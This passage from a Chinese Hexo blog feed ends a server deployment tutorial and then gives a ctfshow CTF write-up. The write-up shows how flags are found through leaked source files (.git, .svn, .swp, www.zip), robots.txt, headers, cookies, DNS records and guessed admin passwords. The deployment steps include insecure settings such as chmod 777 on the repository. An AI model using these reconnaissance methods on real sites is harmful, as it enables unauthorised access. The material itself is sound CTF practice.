zlib1g-dev#解决依赖包zlib安装<br>sudo apt install gcc#解决依赖包gcc安装<br>sudo apt install g++#解决依赖包g++安装<br></code></pre></td></tr></table></figure><p>(2)在官网下载nginx源码，并上传到服务器上。也在云服务器上使用weget命令下载nginx,在这里示范一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://nginx.org/download/nginx-1.20.1.tar.gz <br></code></pre></td></tr></table></figure><p>(3)使用命令解压nginx并进入目录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xvf nginx-1.20.1.tar.gz<br>cd nginx-1.20.1<br></code></pre></td></tr></table></figure><p>(4)安装nginx。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./configure#检查所需要的依赖是否已经安装make<br>make install#编译安装<br></code></pre></td></tr></table></figure><p>(5)检查nginx是否安装成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whereis nginx#查找nginx安装目录cd /usr/local/nginx/sbin#进入nginx目录./nginx#启动nginx<br></code></pre></td></tr></table></figure><p>若启动后没有出现报错的情况，则代表启动成功，此时可以通过“公网IP+端口”的方式访问服务器（默认是开放80端口），若出现nginx欢迎的界面，则代表安装成功，如下图所示：</p><h5 id="2-2-安装node-js"><a href="#2-2-安装node-js" class="headerlink" title="2.2 安装node.js"></a>2.2 安装node.js</h5><p>为了方便，这里直接采用命令安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install nodejs<br></code></pre></td></tr></table></figure><h5 id="2-3-安装git"><a href="#2-3-安装git" class="headerlink" title="2.3 安装git"></a>2.3 安装git</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install git<br></code></pre></td></tr></table></figure><h5 id="2-4-创建git用户"><a href="#2-4-创建git用户" class="headerlink" title="2.4 创建git用户"></a>2.4 创建git用户</h5><p>为了实现博客的自动部署，使用非root用户进行自动部署，创建一个新的用户，用于远程公钥免密登录服务器。</p><p>(1)创建git用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adduser git<br></code></pre></td></tr></table></figure><p>(2)修改git用户权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 740 /etc/sudoers<br></code></pre></td></tr></table></figure><p>(3)将git用户赋予sudo权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -i &quot;21 i git ALL=(ALL:ALL) ALL&quot; /etc/sudoers<br></code></pre></td></tr></table></figure><p>(4) 修改权限及配置用户密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 400 /etc/sudoers#将sudoers文件权限降到最低<br>sudo passwd git #设置git用户密码<br></code></pre></td></tr></table></figure><h5 id="2-5-将git用户配置ssh免密登录"><a href="#2-5-将git用户配置ssh免密登录" class="headerlink" title="2.5 将git用户配置ssh免密登录"></a>2.5 将git用户配置ssh免密登录</h5><p><strong>在本地上</strong></p><p>打开cmd命令窗口，输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.ssh<br>ssh-keygen<br></code></pre></td></tr></table></figure><p>系统默认会在.ssh文件夹下生成id_rsa(私钥)和id_rsa.pub(公钥)，这时我们需要将公钥上传到云服务器上。</p><p><strong>在云服务器上</strong></p><p>首先，我们要确保已经将本地的公钥上传到云服务器上，再在公钥下的文件夹下输入一下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p /home/git/.ssh#创建.ssh文件夹<br>cat id_rsa.pub &gt;/home/git/.ssh/authorized_keys#将公钥复制到authorized_keys<br>rm -rf id_rsa.pub#删除上传的公钥<br></code></pre></td></tr></table></figure><h5 id="2-6配置git仓库"><a href="#2-6配置git仓库" class="headerlink" title="2.6配置git仓库"></a>2.6配置git仓库</h5><p>在云服务器上，先用git用户创建git仓库，并新建一个post-receive钩子文件，添加可执行权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~<br>git init --bare hexo.git<br>chmod 777 /home/git/hexo.git<br>vi ~/hexo.git/hooks/post-receive<br>输入一下内容：<br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>rm -rf /home/git/www<br>git clone /home/git/hexo.git /home/git/www<br>之后，再将post-receive添加可执行权限<br>chmod +x /home/git/hexo.git/post-receive<br></code></pre></td></tr></table></figure><h5 id="2-7在本地部署博客到服务器"><a href="#2-7在本地部署博客到服务器" class="headerlink" title="2.7在本地部署博客到服务器"></a>2.7在本地部署博客到服务器</h5><p>(1)在本地计算机hexo的工程目录下，找到_config.yml，对deploy参数进行修改，如下图所示。</p><img src="/2021/11/03/hexo-build/image-20211003160428276.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">deploy:<br>  type: git   #git形式部署<br>  repository: git@云服务器ip:/home/git/hexo.git#/home/git/hexo.git为仓库的绝对路径<br>  branch: master<br></code></pre></td></tr></table></figure><p>(2)在本地计算机安装插件: hexo-deployer-git 和 hexo-server。在HexoBlogs文件夹下右键打开GitBash，输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">npm install hexo-deployer-git --save</span><br><span class="hljs-meta">$</span><span class="bash">npm install hexo-server</span><br></code></pre></td></tr></table></figure><p>(3)在本地计算机配置Git全局变量。 输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git config --global user.email <span class="hljs-string">&quot;xxxxxxxxxx@qq.com&quot;</span></span><br><span class="hljs-meta">$</span><span class="bash"> git config --global user.name “git”</span><br></code></pre></td></tr></table></figure><p>(4)使用Hexo生成、发布个人博客。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hexo clean</span><br><span class="hljs-meta">$</span><span class="bash"> hexo generate</span><br><span class="hljs-meta">$</span><span class="bash"> hexo deploy</span><br></code></pre></td></tr></table></figure><h5 id="2-8设置nginx路由"><a href="#2-8设置nginx路由" class="headerlink" title="2.8设置nginx路由"></a>2.8设置nginx路由</h5><p>修改nginx配置文件，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /usr/local/conf/nginx.conf<br></code></pre></td></tr></table></figure><p>在server下，修改root那行，/home/git/www为我们网站的绝对路径，如图所示：</p><img src="/2021/11/03/hexo-build/image-20211101153611228.png" class=""><h5 id="2-9添加定时任务"><a href="#2-9添加定时任务" class="headerlink" title="2.9添加定时任务"></a>2.9添加定时任务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">crontab -e<br>0 1 * * * reboot#1点定时重启<br>1 1 * * * ./usr/local/nginx/sbin/nginx#1点零1分开启nginx<br></code></pre></td></tr></table></figure><p>当显示以下英文时，表示成功添加定时任务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">crontab: installing new crontab<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow web入门做题记录</title>
    <link href="/2021/11/01/ctfshow/"/>
    <url>/2021/11/01/ctfshow/</url>
    
    <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><h4 id="网站注释泄露"><a href="#网站注释泄露" class="headerlink" title="网站注释泄露"></a>网站注释泄露</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web1:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>打开网站，查看源码，发现flag藏在源码注释里里</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>web1:where is flag?<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-comment">&lt;!-- ctfshow&#123;bb9031ff-5fea-434d-a1be-33910335086a&#125; --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><h4 id="js前端拦截（禁止查看源代码）"><a href="#js前端拦截（禁止查看源代码）" class="headerlink" title="js前端拦截（禁止查看源代码）"></a>js前端拦截（禁止查看源代码）</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">无法显示源代码<br></code></pre></td></tr></table></figure><p>页面显示无法查看源代码，按ctrl u也没有用，在url地址栏最前面输入view-source:并回车，则显示页面的源代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript"><span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>无法查看源代码<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-comment">&lt;!-- ctfshow&#123;b42c35c6-0a01-42fb-aeba-6dc934d35fed&#125; --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web3:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>按f12，我们可以发现，flag藏在响应头里。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 06 Sep 2021 02:56:22 GMT<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>ctfshow&#123;77d13684-4b77-4131-bf47-6eaaeb46d419&#125;<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.16.1<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.11<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br></code></pre></td></tr></table></figure><h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><h4 id="robots泄露"><a href="#robots泄露" class="headerlink" title="robots泄露"></a>robots泄露</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web4:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>我们在地址栏访问robots.txt，发现以下内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">User-agent: *<br>Disallow: /flagishere.txt<br></code></pre></td></tr></table></figure><p>接着我们访问url/flagishere.txt,发现flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">3</span>de<span class="hljs-number">3</span>be<span class="hljs-number">12</span>-<span class="hljs-number">5</span>b<span class="hljs-number">18</span>-<span class="hljs-number">45</span>c<span class="hljs-number">9</span>-<span class="hljs-number">9</span>d<span class="hljs-number">92</span>-<span class="hljs-number">31458</span>d<span class="hljs-number">7</span>c<span class="hljs-number">07</span>e<span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><h4 id="phps泄露（index-phps）"><a href="#phps泄露（index-phps）" class="headerlink" title="phps泄露（index.phps）"></a>phps泄露（index.phps）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web5:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag ?<br></code></pre></td></tr></table></figure><p>试着访问/index.phps，发现源码泄露。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-01 14:14:17<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-01 14:34:53<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>//ctfshow&#123;3f531588-7428-4e31-973f-841e438a8c69&#125;<br>echo &quot;web5:where is flag ?&quot;<br></code></pre></td></tr></table></figure><h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><h4 id="源码泄露（www-zip）"><a href="#源码泄露（www-zip）" class="headerlink" title="源码泄露（www.zip）"></a>源码泄露（<a href="http://www.zip)/">www.zip）</a></h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web6:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>在地址栏下访问/<a href="http://www.zip,发现源码泄露.解压www.zip文件,发现有两个文件./">www.zip，发现源码泄露。解压www.zip文件，发现有两个文件。</a></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">fl000g.txt<br><span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><p>打开index.php，发现提示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接着我们在地址栏访问fl000g.txt，发现flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;ffcc<span class="hljs-number">30</span>e<span class="hljs-number">9</span>-<span class="hljs-number">8</span>fb<span class="hljs-number">2</span>-<span class="hljs-number">4</span>ae<span class="hljs-number">7</span>-<span class="hljs-number">99</span>f<span class="hljs-number">6</span>-<span class="hljs-number">01</span>b<span class="hljs-number">53</span>b<span class="hljs-number">9641</span>f<span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h4><h4 id="git泄露（-git）"><a href="#git泄露（-git）" class="headerlink" title="git泄露（.git）"></a>git泄露（.git）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web7:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>先扫下目录，发现有/.git泄露。接着我们直接用GitHack进行利用,结果利用失败。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[+] Download and parse index file ...<br><span class="hljs-keyword">error: </span>Not a Git index file   <br></code></pre></td></tr></table></figure><p>查看wp，发现在地址栏输入url/.git/index.php，即可得到flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">1</span>a<span class="hljs-number">97292</span>e-<span class="hljs-number">2</span>aba-<span class="hljs-number">40</span>ee-<span class="hljs-number">8</span>e<span class="hljs-number">2</span>a-<span class="hljs-number">5527799</span>be<span class="hljs-number">7</span>f<span class="hljs-number">9</span>&#125; <br></code></pre></td></tr></table></figure><p>大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞，GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</p><h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><h4 id="svn泄露（-svn）"><a href="#svn泄露（-svn）" class="headerlink" title="svn泄露（.svn）"></a>svn泄露（.svn）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web8:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure><p>在地址栏输入url/.svn/，得到flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">95</span>a<span class="hljs-number">26</span>e<span class="hljs-number">06</span>-a<span class="hljs-number">7</span>d<span class="hljs-number">2</span>-<span class="hljs-number">47</span>bb-<span class="hljs-number">8</span>db<span class="hljs-number">8</span>-<span class="hljs-number">1</span>de<span class="hljs-number">85</span>d<span class="hljs-number">2</span>a<span class="hljs-number">79</span>d<span class="hljs-number">4</span>&#125; <br></code></pre></td></tr></table></figure><h4 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h4><h4 id="vim泄露（index-php-swp）"><a href="#vim泄露（index-php-swp）" class="headerlink" title="vim泄露（index.php.swp）"></a>vim泄露（index.php.swp）</h4><p>在地址栏输入url/index.php.swp,得到flag。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">ctfshow&#123;f900f8c7-<span class="hljs-number">0938</span>-4cbf-921f-<span class="hljs-number">43048b291969</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h4><h4 id="cookie泄露（flag藏在cookie里）"><a href="#cookie泄露（flag藏在cookie里）" class="headerlink" title="cookie泄露（flag藏在cookie里）"></a>cookie泄露（flag藏在cookie里）</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Date</span>: Mon, <span class="hljs-number">06</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">49</span>:<span class="hljs-number">37</span> GMT<br><span class="hljs-attribute">Server</span>: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">16</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Set</span>-Cookie: flag=ctfshow%<span class="hljs-number">7</span>B<span class="hljs-number">235</span>cda<span class="hljs-number">01</span>-<span class="hljs-number">3</span>e<span class="hljs-number">30</span>-<span class="hljs-number">4724</span>-ab<span class="hljs-number">30</span>-<span class="hljs-number">1</span>b<span class="hljs-number">517</span>cf<span class="hljs-number">30064</span>%<span class="hljs-number">7</span>D<br><span class="hljs-attribute">X</span>-Powered-By: PHP/<span class="hljs-number">7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">11</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h4 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h4><h4 id="域名信息泄露"><a href="#域名信息泄露" class="headerlink" title="域名信息泄露"></a>域名信息泄露</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">域名其实也可以隐藏信息，比如ctfshow<span class="hljs-selector-class">.com</span> 就隐藏了一条信息<br></code></pre></td></tr></table></figure><p>这里通过访问<a href="https://zijian.aliyun.com/dns%E6%A3%80%E6%9F%A5%E6%9F%A5%E8%AF%A2TXT">https://zijian.aliyun.com/dns检查查询TXT</a> 记录（一般指为某个主机名或域名设置的说明），发现flag。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;just_seesee&#125;</span><br></code></pre></td></tr></table></figure><h4 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h4><h4 id="网站管理员密码泄露（-admin-index-php）"><a href="#网站管理员密码泄露（-admin-index-php）" class="headerlink" title="网站管理员密码泄露（/admin/index.php）"></a>网站管理员密码泄露（/admin/index.php）</h4><p>通过访问url/admin/index.php，发现需要密码登录，在主页最下面发现电话号码：372619038，尝试使用admin 372619038登录，登录成功，发现flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">32</span>bca<span class="hljs-number">6</span>b<span class="hljs-number">7</span>-eaf<span class="hljs-number">2</span>-<span class="hljs-number">48</span>b<span class="hljs-number">5</span>-a<span class="hljs-number">205</span>-<span class="hljs-number">98342</span>ae<span class="hljs-number">217</span>d<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h4><h4 id="网站页面信息泄露（页面上有个document-点击有个下载）"><a href="#网站页面信息泄露（页面上有个document-点击有个下载）" class="headerlink" title="网站页面信息泄露（页面上有个document,点击有个下载）"></a>网站页面信息泄露（页面上有个document,点击有个下载）</h4><p>在网页最下面发现有document，点击下载文档，发现管理员账号密码，尝试登录，发现flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;e<span class="hljs-number">58</span>f<span class="hljs-number">67</span>b<span class="hljs-number">7</span>-<span class="hljs-number">9</span>cf<span class="hljs-number">8</span>-<span class="hljs-number">4</span>fd<span class="hljs-number">2</span>-<span class="hljs-number">8812</span>-<span class="hljs-number">64</span>f<span class="hljs-number">4</span>caae<span class="hljs-number">909</span>e&#125;<br></code></pre></td></tr></table></figure><h4 id="web14"><a href="#web14" class="headerlink" 